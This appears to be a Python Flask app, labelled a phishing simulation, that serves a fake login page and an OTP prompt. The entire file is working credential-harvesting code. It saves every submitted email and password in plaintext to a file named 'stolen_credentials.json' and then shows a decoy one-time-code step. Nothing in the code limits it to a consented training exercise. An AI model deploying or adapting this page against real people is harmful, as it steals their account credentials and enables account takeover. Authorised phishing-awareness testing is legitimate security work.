from flask import Flask, request, render_template, session, redirect, url_for
import pyotp
import json
import os

app = Flask(__name__)
app.secret_key = "your_secret_key"

# Generate a TOTP Secret Key for MFA
MFA_SECRET = pyotp.random_base32()
totp = pyotp.TOTP(MFA_SECRET)

# File to store captured credentials
CREDENTIALS_FILE = "stolen_credentials.json"

# Function to store captured credentials
def save_credentials(email, password):
    credentials = {}
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, "r") as file:
            credentials = json.load(file)

    credentials[email] = password

    with open(CREDENTIALS_FILE, "w") as file:
        json.dump(credentials, file, indent=4)

# Login Page (Phishing Simulation)
@app.route("/", methods=["GET", "POST"])
def fake_login():
    if request.method == "POST":
        email = request.form["email"]
        password = request.form["password"]
        save_credentials(email, password)  # Save to file
        session["email"] = email  # Save to session
        return redirect(url_for("otp_verification"))
    return render_template("login.html")

# OTP Verification
@app.route("/otp", methods=["GET", "POST"])
def otp_verification():
    if "email" not in session:
        return redirect(url_for("fake_login"))

    error = None
    # OTP is here
    print("Current OTP:", totp.now())

    if request.method == "POST":
        user_otp = request.form["otp"]
        if totp.verify(user_otp):
            return render_template("success.html")
        else:
            error = "Invalid OTP. Try again."
    return render_template("otp.html", error=error)

# Success Page
@app.route("/success")
def success():
    return render_template("success.html")

if __name__ == "__main__":
    app.run(debug=True)
